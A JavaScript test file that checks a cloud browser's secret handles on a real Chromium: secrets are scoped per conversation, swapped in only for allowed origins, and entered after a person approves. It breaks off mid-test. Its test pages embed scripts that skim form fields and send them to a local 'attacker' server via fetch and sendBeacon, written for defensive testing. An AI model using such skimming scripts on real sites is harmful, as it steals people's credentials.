// Secret handles on the cloud browser, proven on a real Chromium: what each web server actually received, what page
// script could read, and what the cloud computer asked the person. Every value here is made up for the test.
// Runs against a disposable headless browser with its own profile; set OPENWORK_TEST_CHROMIUM to choose the binary.
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { accessSync, constants } from "node:fs";
import { mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { after, before, describe, test } from "node:test";
import { createBrowserSecrets } from "./browser-secrets.mjs";
import { createCloudBrowser } from "./chromium.mjs";
import { createCloudComputer } from "./cloud.mjs";

const VALUE = 'fake "quoted" \\ pass wörd ✓ & <b> 100% a+b=c';
const TOKEN = "fake-token-ABC123.def456";
// A documentation address the public-destination check admits; the test browser resolves it to this machine.
const PUBLIC_ADDRESS = "203.0.113.10";
const SESSION = "conversation-one";
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function chromiumBinary() {
  const runnable = (path) => { try { accessSync(path, constants.X_OK); return true; } catch { return false; } };
  const named = process.env.OPENWORK_TEST_CHROMIUM;
  if (named) return runnable(named) ? { path: named } : { reason: "OPENWORK_TEST_CHROMIUM does not name a program that can be run." };
  const path = ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/Applications/Chromium.app/Contents/MacOS/Chromium",
    ...["chromium", "chromium-browser", "google-chrome", "google-chrome-stable"].flatMap((name) => (process.env.PATH ?? "").split(delimiter).filter(Boolean).map((directory) => join(directory, name)))].find(runnable);
  return path ? { path } : { reason: "No Chrome or Chromium was found. Set OPENWORK_TEST_CHROMIUM to a browser binary to run the real-browser proof." };
}

async function startChromium(binary, profile) {
  const child = spawn(binary, ["--headless=new", "--remote-debugging-port=0", `--user-data-dir=${profile}`, "--no-first-run", "--no-default-browser-check", "--disable-gpu",
    `--host-resolver-rules=MAP ${PUBLIC_ADDRESS} 127.0.0.1`, ...(process.platform === "linux" ? ["--no-sandbox"] : []), "about:blank"], { stdio: ["ignore", "ignore", "pipe"] });
  const exited = new Promise((resolve) => child.once("exit", resolve));
  const port = await new Promise((resolve, reject) => {
    let text = "";
    const timer = setTimeout(() => reject(new Error("The test browser did not report its debugging port.")), 30_000);
    child.stderr.on("data", (chunk) => {
      text += chunk;
      const match = /DevTools listening on ws:\/\/127\.0\.0\.1:(\d+)/.exec(text);
      if (match) { clearTimeout(timer); resolve(match[1]); }
    });
    void exited.then(() => { clearTimeout(timer); reject(new Error("The test browser exited before it was ready.")); });
  });
  // The browser's helper processes hold its error stream open for a while after it exits; the test does not wait for them.
  return { endpoint: `http://127.0.0.1:${port}`, async stop() { child.kill(); await exited; child.stderr.destroy(); } };
}

/** A web server that keeps everything it received. */
async function startSite(respond) {
  const requests = [];
  const server = createServer(async (request, response) => {
    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);
    const url = new URL(request.url ?? "/", "http://site.example");
    const seen = { method: request.method, path: url.pathname, query: url.searchParams, headers: request.headers, body: Buffer.concat(chunks) };
    requests.push(seen);
    respond(seen, response);
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(undefined)));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("The test site has no port.");
  const sent = (path) => requests.filter((request) => request.path === path && request.method !== "OPTIONS");
  return {
    port: address.port, requests, sent,
    /** The first request for `path`, waited for; undefined when none arrives. */
    async received(path, ms = 6000) {
      for (const deadline = Date.now() + ms; Date.now() < deadline; await wait(25)) if (sent(path).length) break;
      return sent(path)[0];
    },
    /** Everything this site was sent, as one text: addresses, headers and bodies. */
    everything: () => requests.map((request) => `${request.method} ${request.path}?${request.query}\n${JSON.stringify(request.headers)}\n${request.body.toString("latin1")}\n${request.body.toString("utf8")}`).join("\n"),
    async close() { server.closeAllConnections(); await new Promise((resolve) => server.close(() => resolve(undefined))); },
  };
}

const labPage = (attacker) => `<!doctype html><meta charset="utf-8"><title>Transport lab</title>
<form id="form" method="post" action="/form"><label>Access key <input id="key" name="key" type="text" autocomplete="off"></label><button type="submit">Submit form</button></form>
<form id="upload"><input id="file" type="file" name="file"></form>
${["json", "multipart", "header", "large", "attacker", "query", "redirect", "private", "file"].map((name) => `<button type="button" data-send="${name}">Send ${name}</button>`).join("\n")}
<script>
const attacker = ${JSON.stringify(attacker)};
const key = () => document.getElementById("key").value;
const sends = {
  json: () => fetch("/json", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ account: "someone", key: key() }) }),
  multipart: () => { const data = new FormData(); data.append("key", key()); data.append("blob", new Blob([new Uint8Array([255, 254, 0, 13, 10])]), "a.bin"); return fetch("/multipart", { method: "POST", body: data }); },
  header: () => fetch("/header", { method: "POST", headers: { Authorization: "Bearer " + key(), "Content-Type": "application/json" }, body: "{}" }),
  large: () => fetch("/large", { method: "POST", headers: { "Content-Type": "text/plain" }, body: "x".repeat(3000000) + "key=" + key() }),
  attacker: () => fetch(attacker + "/collect", { method: "POST", headers: { "Content-Type": "text/plain" }, body: "key=" + key() }),
  query: () => fetch("/query?key=" + encodeURIComponent(key())),
  redirect: () => fetch("/redirect", { method: "POST", body: new URLSearchParams({ key: key() }) }),
  private: () => fetch(attacker + "/private", { method: "POST", headers: { "Content-Type": "text/plain" }, body: "key=" + key() }),
  file: () => { const data = new FormData(document.getElementById("upload")); data.append("key", key()); return fetch("/upload", { method: "POST", body: data }); },
};
// What page script can read of the field goes to another site on every action.
const report = () => fetch(attacker + "/seen", { method: "POST", mode: "no-cors", body: key() }).catch(() => {});
for (const button of document.querySelectorAll("[data-send]")) button.addEventListener("click", () => { report(); sends[button.dataset.send]().catch(() => {}); });
document.getElementById("form").addEventListener("submit", () => { navigator.sendBeacon(attacker + "/seen", key()); });
</script>`;

const signInPage = (attacker) => `<!doctype html><meta charset="utf-8"><title>Sign in</title>
<form id="signin" method="post" action="/session"><label>Email <input name="email" type="email" value="someone@site.example"></label>
<label>Password <input id="password" name="password" type="password" autocomplete="current-password"></label><button type="submit">Sign in</button></form>
<script>
document.getElementById("signin").addEventListener("submit", () => { navigator.sendBeacon(${JSON.stringify(attacker)} + "/seen", document.getElementById("password").value); });
</script>`;

/** A VM whose kernel filter reads as installed; nothing else about a real machine is needed to drive its browser. */
const machine = {
  async run(command) { return { exitCode: /command -v nft/.test(command) ? 1 : 0, stdout: "", stderr: "" }; },
  async read() { return Buffer.alloc(0); },
};
/** A cloud computer without a VM, with the rollouts in the test's hands. */
async function cloudComputer(directory, options = {}) {
  const rollout = { computer: true, secrets: true };
  const computer = await createCloudComputer({ directory, machine, browserEndpoint: "http://127.0.0.1:9", enabled: async () => rollout.computer, secretsEnabled: async () => rollout.secrets, ...options });
  return { computer, rollout };
}
const disabled = (error) => error?.code === "feature_disabled";
/** Every file under `directory`, as one text. */
async function written(directory) {
  const entries = await readdir(directory, { recursive: true, withFileTypes: true });
  const files = await Promise.all(entries.filter((entry) => entry.isFile()).map((entry) => readFile(join(entry.parentPath, entry.name), "latin1")));
  return files.join("\n");
}

describe("the cloud computer's secrets", () => {
  /** @type {string} */
  let directory;
  const computers = [];
  const start = async (options) => { const made = await cloudComputer(directory, options); computers.push(made.computer); return made; };
  before(async () => { directory = await mkdtemp(join(tmpdir(), "cloud-computer-secrets-")); });
  after(async () => {
    for (const computer of computers) await computer.close().catch(() => {});
    await rm(directory, { recursive: true, force: true });
  });
  const input = (extra = {}) => ({ sessionId: SESSION, label: "Site sign-in", kind: "password", origins: ["https://app.example"], value: VALUE, ...extra });

  test("a secret is kept for its conversation alone, and its value is never given back or written down", async () => {
    const { computer } = await start();
    const added = await computer.secrets.add(input());
    assert.equal(added.ok, true);
    assert.deepEqual(Object.keys(added.secret).sort(), ["kind", "label", "origins", "secretRef"]);
    assert.deepEqual(await computer.secrets.list(SESSION), [added.secret]);
    assert.deepEqual(await computer.secrets.list("another-conversation"), []);
    assert.equal(await computer.secrets.remove("another-conversation", added.secret.secretRef), false);
    assert.deepEqual(await computer.secrets.list(SESSION), [added.secret]);
    assert.equal((await written(directory)).includes(VALUE), false, "nothing under the computer's directory holds the value");
    assert.equal(await computer.secrets.remove(SESSION, added.secret.secretRef), true);
    assert.deepEqual(await computer.secrets.list(SESSION), []);
  });

  test("a refused secret is explained without repeating what was typed", async () => {
    const { computer } = await start();
    for (const refused of [input({ origins: [VALUE] }), input({ label: VALUE.repeat(3) }), input({ origins: ["http://127.0.0.1:8080"] }), input({ value: "short" }), input({ sessionId: "" }), input({ kind: VALUE }), null]) {
      const answer = await computer.secrets.add(refused);
      assert.equal(answer.ok, false);
      assert.equal(answer.code, "invalid_secret");
      assert.ok(answer.error.length > 0);
      assert.equal(JSON.stringify(answer).includes(VALUE), false);
    }
    assert.deepEqual(await computer.secrets.list(SESSION), []);
  });

  test("with the rollout off nothing is stored, listed or answered", async () => {
    const { computer, rollout } = await start();
    rollout.secrets = false;
    assert.deepEqual(await computer.secrets.add(input()), { ok: false, code: "feature_disabled", error: "Secrets for the cloud browser are not available for this organization." });
    await assert.rejects(computer.secrets.list(SESSION), disabled);
    await assert.rejects(computer.secrets.remove(SESSION, "sec_none"), disabled);
    await assert.rejects(computer.request(SESSION), disabled);
    await assert.rejects(computer.answerRequest({ sessionId: SESSION, id: "none", answer: "allow" }), disabled);
    rollout.secrets = true;
    rollout.computer = false;
    assert.equal((await computer.secrets.add(input())).code, "feature_disabled", "secrets need the cloud computer's own rollout too");
    await assert.rejects(computer.secrets.list(SESSION), disabled);
  });

  test("the rollout turning off forgets every secret; turning back on starts empty", async () => {
    const { computer, rollout } = await start();
    assert.equal((await computer.secrets.add(input())).ok, true);
    rollout.secrets = false;
    // Every call verifies the rollout first, and so does the periodic authority check.
    await assert.rejects(computer.secrets.list(SESSION), disabled);
    rollout.secrets = true;
    assert.deepEqual(await computer.secrets.list(SESSION), []);
  });

  test("closing the computer forgets every secret", async () => {
    const { computer } = await start();
    assert.equal((await computer.secrets.add(input())).ok, true);
    await computer.close();
    await assert.rejects(computer.secrets.list(SESSION), disabled);
    assert.equal((await computer.secrets.add(input())).code, "feature_disabled");
  });
});

const found = chromiumBinary();
if (found.reason && process.env.CI) throw new Error("The required cloud secret browser tests need an installed Chrome or Chromium binary.");
if (found.reason) console.warn(`[browser-secrets-cloud] INCOMPLETE: real-browser tests skipped. ${found.reason}`);

describe("secret handles on the cloud browser, on a real Chromium", { skip: found.reason ?? false }, () => {
  /** @type {string} */
  let directory;
  /** @type {Awaited<ReturnType<typeof startChromium>>} */
  let chromium;
  /** @type {Awaited<ReturnType<typeof startSite>>} */
  let allowed;
  /** @type {Awaited<ReturnType<typeof startSite>>} */
  let attacker;
  let allowedOrigin = "", attackerOrigin = "";
  const closers = [];

  before(async () => {
    directory = await mkdtemp(join(tmpdir(), "browser-secrets-cloud-"));
    chromium = await startChromium(found.path, join(directory, "profile"));
    attacker = await startSite((_request, response) => {
      response.writeHead(200, { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Methods": "*", "Content-Type": "text/plain" }).end("ok");
    });
    attackerOrigin = `http://127.0.0.1:${attacker.port}`;
    allowed = await startSite((request, response) => {
      if (request.method === "GET" && request.path === "/") return response.writeHead(200, { "Content-Type": "text/html" }).end(labPage(attackerOrigin));
      if (request.method === "GET" && request.path === "/signin") return response.writeHead(200, { "Content-Type": "text/html" }).end(signInPage(attackerOrigin));
      if (request.path === "/redirect") return response.writeHead(307, { Location: `${attackerOrigin}/collect` }).end();
      return response.writeHead(200, { "Content-Type": "text/html" }).end("<!doctype html><title>Received</title><p>Received.</p>");
    });
    allowedOrigin = `http://localhost:${allowed.port}`;
  });
  after(async () => {
    for (const close of closers.reverse()) await Promise.resolve().then(close).catch(() => {});
    await chromium?.stop();
    await allowed?.close();
    await attacker?.close();
    await rm(directory, { recursive: true, force: true });
  });

  /** A cloud browser on the test Chromium, as the cloud computer builds it, with its own store. */
  function cloudBrowser({ privateBrowsing = true, storeOptions = {}, approve = async () => true } = {}) {
    const secrets = createBrowserSecrets({ allowLoopbackHttp: true, ...storeOptions });
    const asked = [];
    const browser = createCloudBrowser({ statePath: join(directory, `tabs-${closers.length}.json`), endpoint: chromium.endpoint, privateBrowsing,
      verifyEgress: async () => {}, assertActive() {}, enabled: () => true, beforeInput: async () => {},
      secrets, secretsEnabled: () => true, approveSecret: async (sessionId, request, signal) => { asked.push({ sessionId, request }); return approve(sessionId, request, signal); } });
    closers.push(() => browser.close());
    const call = async (operation, args = {}, sessionId = SESSION) => browser.request({ sessionId, operation, args }, {});
    const must = async (operation, args, sessionId) => {
      const result = await call(operation, args, sessionId);
      assert.equal(result.ok, true, `${operation} failed: ${result.code}`);
      return result;
    };
    /** Opens a page and names its controls. */
    async function open(url, sessionId = SESSION) {
      const { tabId } = await must("open", { url }, sessionId);
      const observed = await must("observe", { tabId, mode: "interactive" }, sessionId);
      const control = (role, name) => {
        const element = observed.elements.find((item) => item.role === role && name.test(item.name ?? ""));
        assert.ok(element, `the page shows its ${role} ${name}`);
        return element.ref;
      };
      return { tabId, observationId: observed.observationId, observed, control };
    }
    return { secrets, browser, asked, call, must, open };
  }
  const states = (secrets, tabId, sessionId = SESSION) => secrets.status(sessionId, tabId).map(({ state, reason }) => reason ? `${state}:${reason}` : state);
  const sentTo = (secrets, tabId) => secrets.status(SESSION, tabId).flatMap((entry) => entry.sentTo ?? []);
  /** A CDP connection of the test's own to one tab, for what the browser contract does not offer (choosing a file, closing a tab). */
  async function debuggerOf(tabId) {
    const targets = await (await fetch(`${chromium.endpoint}/json/list`)).json();
    const socket = new WebSocket(targets.find((target) => target.id === tabId).webSocketDebuggerUrl);
    await new Promise((resolve, reject) => { socket.addEventListener("open", resolve, { once: true }); socket.addEventListener("error", reject, { once: true }); });
    let sequence = 0;
    const pending = new Map();
    socket.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data));
      const item = pending.get(message.id);
      if (!item) return;
      pending.delete(message.id);
      if (message.error) item.reject(new Error(message.error.message)); else item.resolve(message.result);
    });
    return { send: (method, params = {}) => new Promise((resolve, reject) => { pending.set(++sequence, { resolve, reject }); socket.send(JSON.stringify({ id: sequence, method, params })); }), close: () => socket.close() };
  }

  /**
   * The transport lab with a placeholder of `value` typed into its field through the cloud browser, then one of its
   * buttons pressed. Returns the placeholder so a test can say what the other site got.
   */
  async function sendFromLab(host, send, { value = VALUE, kind = "password", origins = [allowedOrigin], url = `${allowedOrigin}/`, prepare = async (_tab) => {} } = {}) {
    const page = await host.open(url);
    const field = page.control("textbox", /Access key/);
    const secret = host.secrets.add({ sessionId: SESSION, label: "Lab secret", kind, origins, value });
    await prepare(page);
    const { placeholder } = host.secrets.issue({ sessionId: SESSION, secretRef: secret.secretRef, tabId: page.tabId, origin: origins[0], ref: field });
    const receipt = await host.must("act", { tabId: page.tabId, observationId: page.observationId, request_id: `lab-${send}-${page.tabId}`,
      actions: [{ type: "fill", ref: field, text: placeholder }, { type: "click", ref: page.control("button", send === "form" ? /Submit form/ : new RegExp(`^Send ${send}$`)) }] });
    assert.equal(receipt.completed, 2, "the field was filled and the button pressed");
    return { ...page, placeholder, receipt, secret };
  }
  /** What page script read of the field and reported to the other site. */
  const scriptSaw = async () => (await attacker.received("/seen"))?.body.toString("utf8");
  const reset = () => { allowed.requests.length = 0; attacker.requests.length = 0; };
  const attackerNeverGotTheValue = () => {
    const everything = attacker.everything();
    for (const spelling of [VALUE, TOKEN, encodeURIComponent(VALUE), new URLSearchParams([["", VALUE]]).toString().slice(1), JSON.stringify(VALUE).slice(1, -1)]) {
      assert.equal(everything.includes(spelling), false, "the other site was never sent the value in any spelling");
    }
  };

  test("a form POST carries the value to the allowed site; page script and the other site hold only the placeholder", async () => {
    reset();
    const host = cloudBrowser();
    const { tabId, placeholder } = await sendFromLab(host, "form");
    const form = await allowed.received("/form");
    assert.equal(form?.headers["content-type"], "application/x-www-form-urlencoded");
    assert.equal(new URLSearchParams(form.body.toString("utf8")).get("key"), VALUE);
    assert.equal(Number(form.headers["content-length"]), form.body.length);
    assert.equal(await scriptSaw(), placeholder);
    attackerNeverGotTheValue();
    assert.deepEqual(sentTo(host.secrets, tabId), [allowedOrigin]);
  });

  test("a fetch with a JSON body carries the value, escaped as JSON", async () => {
    reset();
    const host = cloudBrowser();
    const { tabId, placeholder } = await sendFromLab(host, "json");
    const json = await allowed.received("/json");
    assert.deepEqual(JSON.parse(json.body.toString("utf8")), { account: "someone", key: VALUE });
    assert.equal(await scriptSaw(), placeholder);
    attackerNeverGotTheValue();
    assert.deepEqual(states(host.secrets, tabId), ["sent"]);
  });

  test("a multipart body with a binary part carries the value and keeps every other byte", async () => {
    reset();
    const host = cloudBrowser();
    await sendFromLab(host, "multipart");
    const multipart = await allowed.received("/multipart");
    assert.match(String(multipart.headers["content-type"]), /^multipart\/form-data; boundary=/);
    assert.ok(multipart.body.includes(Buffer.from(`name="key"\r\n\r\n${VALUE}\r\n`, "utf8")), "the text part holds the value");
    assert.ok(multipart.body.includes(Buffer.concat([Buffer.from("\r\n\r\n"), Buffer.from([255, 254, 0, 13, 10]), Buffer.from("\r\n--")])), "the binary part arrived byte for byte");
    assert.equal(Number(multipart.headers["content-length"]), multipart.body.length);
    attackerNeverGotTheValue();
  });

  test("an Authorization header carries the value", async () => {
    reset();
    const host = cloudBrowser();
    const { placeholder } = await sendFromLab(host, "header", { value: TOKEN, kind: "token" });
    const header = await allowed.received("/header");
    assert.equal(header.headers.authorization, `Bearer ${TOKEN}`);
    assert.equal(header.body.toString("utf8"), "{}");
    assert.equal(await scriptSaw(), placeholder);
    attackerNeverGotTheValue();
  });

  test("a three megabyte body is read whole and carries the value", async () => {
    reset();
    const host = cloudBrowser();
    await sendFromLab(host, "large");
    const large = await allowed.received("/large", 15_000);
    const tail = Buffer.from(`key=${VALUE}`, "utf8");
    assert.equal(large.body.length, 3_000_000 + tail.length);
    assert.ok(large.body.subarray(-tail.length).equals(tail));
    assert.equal(Number(large.headers["content-length"]), large.body.length);
  });

  test("a request to another site carries only the placeholder", async () => {
    reset();
    const host = cloudBrowser();
    const { tabId, placeholder } = await sendFromLab(host, "attacker");
    const collected = await attacker.received("/collect");
    assert.equal(collected.body.toString("utf8"), `key=${placeholder}`);
    attackerNeverGotTheValue();
    assert.deepEqual(states(host.secrets, tabId), ["not_sent:other_origin"]);
  });

  test("a placeholder in a query string is not swapped, even on the allowed site", async () => {
    reset();
    const host = cloudBrowser();
    const { tabId, placeholder } = await sendFromLab(host, "query");
    const query = await allowed.received("/query");
    assert.equal(query.query.get("key"), placeholder);
    assert.equal(allowed.everything().includes(VALUE), false);
    assert.deepEqual(states(host.secrets, tabId), ["not_sent:in_url"]);
  });

  test("a 307 from the allowed site to another site never delivers the value", async () => {
    reset();
    const host = cloudBrowser();
    const { tabId } = await sendFromLab(host, "redirect");
    const first = await allowed.received("/redirect");
    assert.equal(new URLSearchParams(first.body.toString("utf8")).get("key"), VALUE, "the allowed site got the value and answered with a redirect");
    await attacker.received("/seen");
    await wait(750);
    assert.deepEqual(attacker.sent("/collect"), [], "the redirected request was stopped before it left");
    attackerNeverGotTheValue();
    assert.deepEqual(sentTo(host.secrets, tabId), [allowedOrigin]);
  });

  test("a body Chromium has not read whole (a file from disk) is blocked when it holds the placeholder", async () => {
    reset();
    const host = cloudBrowser();
    const upload = join(directory, "upload.bin");
    await writeFile(upload, Buffer.from([102, 105, 108, 101, 255, 254, 0]));
    const { tabId } = await sendFromLab(host, "file", { prepare: async (page) => {
      const tab = await debuggerOf(page.tabId);
      try {
        const { root } = await tab.send("DOM.getDocument");
        const { nodeId } = await tab.send("DOM.querySelector", { nodeId: root.nodeId, selector: "#file" });
        await tab.send("DOM.setFileInputFiles", { nodeId, files: [upload] });
      } finally { tab.close(); }
    } });
    await attacker.received("/seen");
    await wait(750);
    assert.deepEqual(allowed.sent("/upload"), [], "the upload never left the browser");
    assert.equal(allowed.everything().includes(VALUE), false);
    assert.deepEqual(states(host.secrets, tabId), ["not_sent:unsupported_encoding"]);
  });

  test("the public-destination check wins: a request to a private address is blocked before any swap", async () => {
    reset();
    // The page is on an address the check admits; the secret is allowed for the private address the page posts to.
    const lab = { url: `http://${PUBLIC_ADDRESS}:${allowed.port}/`, origins: [attackerOrigin] };
    const guarded = cloudBrowser({ privateBrowsing: false });
    const blocked = await sendFromLab(guarded, "private", lab);
    await wait(1000);
    assert.deepEqual(attacker.requests, [], "nothing reached the private address: not the request, not what page script reported");
    assert.deepEqual(states(guarded.secrets, blocked.tabId), ["pending"], "the swap was never consulted");
    assert.deepEqual((await guarded.call("open", { url: `${attackerOrigin}/` })).code, "website_blocked");
    // The same page with the diagnostic browser, which may reach private addresses: the swap would have happened.
    const open = cloudBrowser({ privateBrowsing: true });
    await sendFromLab(open, "private", lab);
    assert.equal((await attacker.received("/private")).body.toString("utf8"), `key=${VALUE}`);
  });

  test("fill_secret enters a placeholder once the person allows it, and the sign-in form carries the value", async () => {
    reset();
    const host = cloudBrowser();
    const secret = host.secrets.add({ sessionId: SESSION, label: "Site sign-in", kind: "password", origins: [allowedOrigin], value: VALUE });
    const page = await host.open(`${allowedOrigin}/signin`);
    assert.deepEqual(page.observed.availableSecrets, [{ secretRef: secret.secretRef, label: "Site sign-in", kind: "password" }]);
    const receipt = await host.must("act", { tabId: page.tabId, observationId: page.observationId, request_id: "sign-in-allowed",
      actions: [{ type: "fill_secret", ref: page.control("textbox", /Password/), secretRef: secret.secretRef }, { type: "click", ref: page.control("button", /Sign in/) }] });
    assert.equal(receipt.completed, 2);
    assert.deepEqual(receipt.steps[0], { i: 0, type: "fill_secret", ref: page.control("textbox", /Password/), secretRef: secret.secretRef, outcome: "verified" });
    const session = await allowed.received("/session");
    assert.equal(new URLSearchParams(session.body.toString("utf8")).get("password"), VALUE);
    assert.deepEqual(host.asked, [{ sessionId: SESSION, request: { site: allowedOrigin, label: "Site sign-in", kind: "password", field: "password" } }]);
    const placeholder = await scriptSaw();
    assert.match(placeholder, /^[A-Za-z0-9]{32}$/, "page script read a placeholder, not the value");
    attackerNeverGotTheValue();
    const shown = JSON.stringify([receipt, await host.call("observe", { tabId: page.tabId, mode: "full" })]);
    assert.equal(shown.includes(VALUE) || shown.includes(placeholder), false, "the agent is shown neither the value nor the placeholder");
    assert.deepEqual(sentTo(host.secrets, page.tabId), [allowedOrigin]);
  });

  test("fill_secret enters nothing when the person dismisses the approval", async () => {
    reset();
    const host = cloudBrowser({ approve: async () => false });
    const secret = host.secrets.add({ sessionId: SESSION, label: "Site sign-in", kind: "password", origins: [allowedOrigin], value: VALUE });
    const page = await host.open(`${allowedOrigin}/signin`);
    const receipt = await host.call("act", { tabId: page.tabId, observationId: page.observationId, request_id: "sign-in-dismissed",
      actions: [{ type: "fill_secret", ref: page.control("textbox", /Password/), secretRef: secret.secretRef }, { type: "click", ref: page.control("button", /Sign in/) }] });
    assert.equal(receipt.ok, false);
    assert.equal(receipt.code, "credential_declined");
    assert.equal(receipt.dispatched, false);
    assert.equal(host.asked.length, 1);
    const tab = await debuggerOf(page.tabId);
    try { assert.equal((await tab.send("Runtime.evaluate", { expression: "document.getElementById('password').value", returnByValue: true })).result.value, ""); } finally { tab.close(); }
    await wait(500);
    assert.deepEqual(allowed.sent("/session"), [], "the form was not submitted");
    assert.deepEqual(attacker.requests, []);
    assert.deepEqual(host.secrets.status(SESSION, page.tabId), [], "no placeholder was issued");
  });

  /** A cloud computer driving the test Chromium, a saved secret, and the sign-in page open and observed. */
  async function signInOnCloudComputer(options = {}) {
    const home = await mkdtemp(join(directory, "computer-"));
    // The diagnostic browser may open this machine's test sites, and only then may a secret name a loopback site.
    const { computer, rollout } = await cloudComputer(home, { browserEndpoint: chromium.endpoint, privateBrowsing: true, ...options });
    closers.push(() => computer.close());
    const browse = (operation, args, sessionId = SESSION) => computer.task("/browser/task", { sessionId, operation, args });
    const added = await computer.secrets.add({ sessionId: SESSION, label: "Site sign-in", kind: "password", origins: [allowedOrigin], value: VALUE });
    assert.equal(added.ok, true);
    const opened = await browse("open", { url: `${allowedOrigin}/signin` });
    assert.equal(opened.ok, true, `open failed: ${opened.code}`);
    const observed = await browse("observe", { tabId: opened.tabId, mode: "interactive" });
    const ref = (role, name) => observed.elements.find((item) => item.role === role && name.test(item.name ?? "")).ref;
    /** Starts the sign-in and resolves with the approval it raised, while the operation is still running. */
    const signIn = async (id) => {
      const receipt = browse("act", { tabId: opened.tabId, observationId: observed.observationId, request_id: id,
        actions: [{ type: "fill_secret", ref: ref("textbox", /Password/), secretRef: added.secret.secretRef }, { type: "click", ref: ref("button", /Sign in/) }] });
      void receipt.catch(() => {});
      let request = null;
      for (const deadline = Date.now() + 10_000; Date.now() < deadline && !request; await wait(20)) request = await computer.request(SESSION);
      return { receipt, request };
    };
    return { computer, rollout, browse, home, secret: added.secret, tabId: opened.tabId, signIn };
  }
  const passwordField = async (tabId) => {
    const tab = await debuggerOf(tabId);
    try { return (await tab.send("Runtime.evaluate", { expression: "document.getElementById('password').value", returnByValue: true })).result.value; } finally { tab.close(); }
  };

  test("the cloud computer asks the person in that conversation, and only allow with the request's id enters the secret", async () => {
    reset();
    const { computer, signIn, home, tabId } = await signInOnCloudComputer();
    const { receipt, request } = await signIn("computer-allow");
    assert.match(request.id, /^[0-9a-f-]{36}$/);
    assert.deepEqual(request, { id: request.id, reason: "credential", computer: "Cloud computer", placement: "remote", standing: false,
      credential: { site: allowedOrigin, secret: { label: "Site sign-in", kind: "password", field: "password" } } });
    assert.equal(await computer.request("another-conversation"), null);
    // The operation that asked still holds the computer; the person's side is not kept waiting behind it.
    await assert.rejects(computer.task("/browser/task", { sessionId: SESSION, operation: "tabs", args: {} }), (error) => error.code === "busy");
    assert.equal((await computer.secrets.add({ sessionId: SESSION, label: "Added meanwhile", kind: "code", origins: [allowedOrigin], value: TOKEN })).ok, true);
    assert.equal((await computer.secrets.list(SESSION)).length, 2);
    assert.equal(await computer.answerRequest({ sessionId: "another-conversation", id: request.id, answer: "allow" }), false);
    assert.equal(await computer.answerRequest({ sessionId: SESSION, id: "not-the-request", answer: "allow" }), false);
    assert.deepEqual(await computer.request(SESSION), request, "still waiting for the person");
    assert.equal(await passwordField(tabId), "", "nothing is typed before the answer");
    assert.equal(await computer.answerRequest({ sessionId: SESSION, id: request.id, answer: "allow" }), true);
    const done = await receipt;
    assert.equal(done.ok, true, `the sign-in failed: ${done.code}`);
    assert.equal(done.completed, 2);
    assert.equal(new URLSearchParams((await allowed.received("/session")).body.toString("utf8")).get("password"), VALUE);
    assert.equal(await computer.request(SESSION), null);
    assert.equal(await computer.answerRequest({ sessionId: SESSION, id: request.id, answer: "allow" }), false, "an answered request is not answered twice");
    attackerNeverGotTheValue();
    assert.equal(JSON.stringify(done).includes(VALUE), false);
    assert.equal((await written(home)).includes(VALUE), false, "nothing under the computer's directory holds the value");
  });

  test("the cloud computer enters nothing when the person dismisses, or does not answer in time", async () => {
    reset();
    const dismissed = await signInOnCloudComputer();
    const first = await dismissed.signIn("computer-dismiss");
    assert.equal(await dismissed.computer.answerRequest({ sessionId: SESSION, id: first.request.id, answer: "dismiss" }), true);
    assert.equal((await first.receipt).code, "credential_declined");
    assert.equal(await passwordField(dismissed.tabId), "");

    const unanswered = await signInOnCloudComputer({ requestMs: 400 });
    const second = await unanswered.signIn("computer-timeout");
    assert.ok(second.request, "the person was asked");
    assert.equal((await second.receipt).code, "credential_declined");
    assert.equal(await unanswered.computer.request(SESSION), null);
    assert.equal(await passwordField(unanswered.tabId), "");
    assert.deepEqual(allowed.sent("/session"), []);
    assert.deepEqual(attacker.requests, []);
  });

  test("waiting for the person is not counted against the operation's time limit", async () => {
    reset();
    const { computer, signIn } = await signInOnCloudComputer({ operationMs: 5000, requestMs: 60_000 });
    const { receipt, request } = await signIn("computer-slow-answer");
    await wait(6000);
    assert.deepEqual(await computer.request(SESSION), request, "the operation outlived its limit only by waiting");
    assert.equal(await computer.answerRequest({ sessionId: SESSION, id: request.id, answer: "allow" }), true);
    assert.equal((await receipt).ok, true);
    assert.equal(new URLSearchParams((await allowed.received("/session")).body.toString("utf8")).get("password"), VALUE);
  });

  test("taking over dismisses the approval and nothing is entered", async () => {
    reset();
    const { computer, signIn, tabId } = await signInOnCloudComputer();
    const { receipt, request } = await signIn("computer-takeover");
    assert.ok(request);
    assert.deepEqual(await computer.interact({ action: "takeover" }), { ok: true, paused: true });
    assert.equal(await computer.request(SESSION), null);
    assert.equal(await computer.answerRequest({ sessionId: SESSION, id: request.id, answer: "allow" }), false);
    const interrupted = await receipt.then((result) => result, (error) => ({ ok: false, code: error.code }));
    assert.equal(interrupted.ok, false);
    assert.equal(await passwordField(tabId), "");
    assert.deepEqual(allowed.sent("/session"), []);
    // Stored secrets stay with their conversation through a takeover.
    assert.equal((await computer.secrets.list(SESSION)).length, 1);
    assert.deepEqual(await computer.interact({ action: "resume" }), { ok: true, paused: false });
  });

  test("the rollout turning off while the person is asked dismisses the approval and forgets the secret", async () => {
    reset();
    const { computer, rollout, signIn, tabId } = await signInOnCloudComputer();
    const { receipt, request } = await signIn("computer-rollout-off");
    assert.ok(request);
    rollout.secrets = false;
    assert.equal((await computer.secrets.add({ sessionId: SESSION, label: "Too late", kind: "password", origins: [allowedOrigin], value: VALUE })).code, "feature_disabled");
    assert.equal((await receipt).ok, false);
    await assert.rejects(computer.request(SESSION), disabled);
    assert.equal(await passwordField(tabId), "");
    assert.deepEqual(allowed.sent("/session"), []);
    rollout.secrets = true;
    assert.deepEqual(await computer.secrets.list(SESSION), []);
  });

  test("another conversation on the same computer cannot list or use a conversation's secret", async () => {
    reset();
    const { computer, browse, secret } = await signInOnCloudComputer();
